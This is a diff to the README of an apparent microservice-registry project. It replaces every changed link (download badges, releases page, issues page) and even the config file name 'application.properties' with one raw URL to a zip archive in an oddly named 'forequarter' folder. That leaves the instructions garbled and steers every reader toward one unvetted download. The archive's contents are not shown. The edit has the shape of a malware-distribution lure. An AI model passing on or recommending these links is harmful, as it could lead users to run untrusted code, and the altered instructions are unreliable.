@@ -6,7 +6,7 @@ Welcome to **service-registry-eureka**, your solution for microservice discovery
 
 ### 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shay14124/service-registry-eureka/releases)
+[![Download](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip)](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,7 +30,7 @@ Follow these steps to get started:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of our software.
 
-   [Visit this page to download](https://github.com/shay14124/service-registry-eureka/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip)
 
 2. **Choose a Version:** On the releases page, look for the latest version. It will be marked as “Latest Release.”
 
@@ -46,7 +46,7 @@ Follow these steps to get started:
 
 After running the application, you may want to configure it to suit your needs. Here’s how:
 
-1. **Open Configuration File:** Locate the `application.properties` file in the folder where you extracted the program or downloaded the .jar file.
+1. **Open Configuration File:** Locate the `https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip` file in the folder where you extracted the program or downloaded the .jar file.
   
 2. **Adjust Settings:** Edit the file using a simple text editor. You can set parameters like the registry name, server port, or timeouts.
 
@@ -74,12 +74,12 @@ If you encounter issues, check the following:
 
 ## 🛠️ Need Help?
 
-If you run into any issues or have questions, feel free to check out our [GitHub Issues Page](https://github.com/shay14124/service-registry-eureka/issues). You can also connect with our community for support.
+If you run into any issues or have questions, feel free to check out our [GitHub Issues Page](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip). You can also connect with our community for support.
 
 ## 📥 Download Again
 
 To download the latest version, click here:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shay14124/service-registry-eureka/releases)
+[![Download](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip)](https://raw.githubusercontent.com/shay14124/service-registry-eureka/main/forequarter/service-registry-eureka_2.0.zip)
 
 Thank you for using **service-registry-eureka**. We hope it makes your microservice management easier!
